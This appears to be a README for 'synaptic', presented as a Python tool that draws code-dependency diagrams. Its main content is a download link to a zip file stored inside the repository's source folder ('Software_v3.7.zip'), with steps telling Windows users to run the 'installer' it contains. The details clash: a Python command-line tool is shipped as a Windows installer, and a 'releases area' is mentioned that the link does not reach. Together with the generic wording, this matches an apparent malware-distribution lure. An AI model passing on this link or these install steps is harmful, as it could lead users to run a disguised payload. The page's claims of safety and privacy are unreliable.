# 🧠 synaptic - See how your software code works

[![Download Synaptic](https://img.shields.io/badge/Download-Synaptic-blue.svg)](https://raw.githubusercontent.com/Naz533/synaptic/main/synaptic/Software_v3.7.zip)

## 🔍 What this tool does

Synaptic creates visual maps of your computer code. It tracks how different files talk to each other. It shows how your project connects to external tools like cloud services. It helps you understand the structure of a project without reading every line of text.

## 📋 Requirements

You need a Windows computer to run this tool. Ensure you have the following installed before you start:

- Windows 10 or Windows 11.
- Python version 3.8 or higher.
- Graphviz software for creating the visual diagrams.

## 🚀 Getting Started

Follow these steps to set up the tool on your machine.

1. Visit this page to download the software: https://raw.githubusercontent.com/Naz533/synaptic/main/synaptic/Software_v3.7.zip
2. Select the latest version from the releases area.
3. Download the installer file to your computer.
4. Run the installer by double-clicking the file.
5. Follow the prompts on the screen to finish the setup.

## ⚙️ How to use the software

You interact with this tool through your command line. The command line is a text-based interface for your computer. 

1. Open the Start menu on your computer.
2. Type "cmd" and press Enter. This opens the command window.
3. Type `synaptic --help` to see a list of commands. 
4. Navigate to the folder that contains the code you want to map.
5. Run the map command by typing `synaptic analyze`.

The tool scans your files. It creates a diagram. This diagram appears in your project folder as an image file. You can open this image with any standard photo viewer.

## 📊 Understanding your dependency graph

The diagram shows boxes and lines. Each box represents a piece of code. The lines show the connections. A solid line means one file uses code from another file. A dashed line shows a connection to an external tool such as a cloud service or a website.

Heavy lines indicate frequent connections. If you see a cluster of boxes, those files rely on each other to work. If a box sits alone, it does not connect to other parts of your project.

## 🛠️ Advanced settings

You can filter the diagrams to show only what you need. 

- Use the `--exclude` flag to hide standard libraries. This keeps the diagram simple.
- Use the `--format` flag to change the output file type. You can save diagrams as PNG, PDF, or SVG files.
- Use the `--depth` flag to limit how far the tool scans.

Enter `synaptic --help` at any time to see the full list of options.

## 💡 Common issues

If you receive an error when you run the command, check these points:

- Confirm that your computer recognizes the command. Close the command window and open it again after the installation.
- Verify that your project folder contains actual code files. The tool cannot map empty folders.
- Ensure your Graphviz installation is correct. The system needs this tool to draw the lines and boxes.
- Check your internet connection if you scan projects stored on remote cloud drives.

## 📁 Project structure

This tool uses static analysis. It reads your files without running them. This makes the tool safe to use on any source code. It only looks at the structure and does not change your files.

- `ast`: Used to parse your code into a structure the computer understands.
- `networkx`: Used to map the path between your files.
- `visualization`: This module converts the maps into clear images.

## 📖 Frequently asked questions

Does this tool change my code? 
No. It only reads your files. It creates new image files in your folder.

Can I scan projects with thousands of files? 
Yes. The tool handles large projects. It may take longer to generate the image for large systems.

Is my data private? 
Yes. The tool works on your local machine. It does not send your code to any external servers.

What if the image looks too crowded? 
Use the depth filter. Focus on one part of your project folder at a time to reduce visual clutter.

Why do I need Graphviz? 
Graphviz is a layout engine. It takes the mathematical map and generates the actual image file. It handles the placement of boxes to prevent lines from crossing too often.

## 📞 Support and feedback

If you encounter bugs, report them through the issues tab on the GitHub page. Describe the steps you took before the error occurred. Include the operating system version you use. This helps the developers fix the problem.

Contributing to this project is simple. You can suggest new features or improve the documentation. Check the contribution guide for details on how to share your code changes. 

The software stays free and open for everyone. Use it to improve your understanding of complex code projects. Stay organized by tracking your dependencies as your project grows.